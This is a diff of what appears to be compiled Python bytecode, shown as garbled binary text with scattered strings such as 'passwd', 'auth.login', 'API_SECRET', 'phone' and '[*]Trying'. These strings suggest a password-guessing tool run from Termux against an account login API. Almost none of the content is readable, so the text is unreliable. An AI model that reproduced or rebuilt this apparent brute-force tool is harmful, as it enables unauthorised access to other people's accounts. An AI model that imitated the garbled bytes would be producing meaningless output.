@@ -35,4 +35,21 @@ c^A^@^@^@^C^@^@^@^E^@^@^@C^@^@^@sï¿½^@^@^@yï¿½^@t^@^@j^A^@j^B^@d^A^@j^C^@t^D^@ï¿
 ^@k
 ^@rï¿½^@^A^A^At^K^@j^N^@ï¿½^@^@^At^@^@j^O^@ï¿½^@^@^An^A^@Xd^@^@S(     ^@^@^@Ns^N^@^@^@[*]Trying > {}s                        $
 s^A^@^@^@
-t^@^@^@^@(^P^@^@^@t^C^@^@^@syst^F^@^@^@stdoutt^E^@^@^@writet^F^@^
+t^@^@^@^@(^P^@^@^@t^C^@^@^@syst^F^@^@^@stdoutt^E^@^@^@writet^F^@^@^@formatt^F^@^@^@passwdt^E^@^                        $
+^D^U^A^R^A
+^A      ^A^R^A^X^A
+^A^H^A
+^A
+^Ac^A^@^@^@^G^@^@^@^D^@^@^@C^@^@^@sï¿½^@^@^@|^@^@}^A^@|^@^@}^B^@d^A^@}^C^@i^K^@d^B^@d^C^@6d^D^@d^                        $
+^@6d    ^@d^K^@6d^L^@d
+^@6d^N^@d^O^@6|^B^@d^D^@6d^P^@d^Q^@6d^R^@d^S^@6}^D^@d^T^@|^A^@^Wd^U^@^W|^B^@^Wd^V^@^W|^C^@^W}^E^                       $
+^@^@^@auth.logint^F^@^@^@methodt^A^@^@^@0t^T^@^@^@return_ssl_resourcess^C^@^@^@1.0t^A^@^@^@vsG^                        $
+^@^@^@API_SECRETR^U^@^@^@R)^@^@^@t^A^@^@^@x(^@^@^@^@(^@^@^@^@s-^@^@^@/data/data/com.termux/file                        $
+^A^Z^Ai^@^@^@^@iÇŠï¿½^@i
+^@^@^@i ^@^@^@t^A^@^@^@8i^H^@^@^@t^B^@^@^@58i^G^@^@^@t^C^@^@^@658i^F^@^@^@t^D^@^@^@7658(^S^@^@^                        $
+^@^@^@t^F^@^@^@randomR^E^@^@^@t^B^@^@^@ost^F^@^@^@systemt       ^@^@^@raw_inputt^E^@^@^@phonet^                        $
+
+^E^A^L^A^O^A
+
+^E^A    ^R
+        ^A"^A^R^@       ^A^R^@^S^A^R^@^S^A^R^@^S^A^R^@^S^A
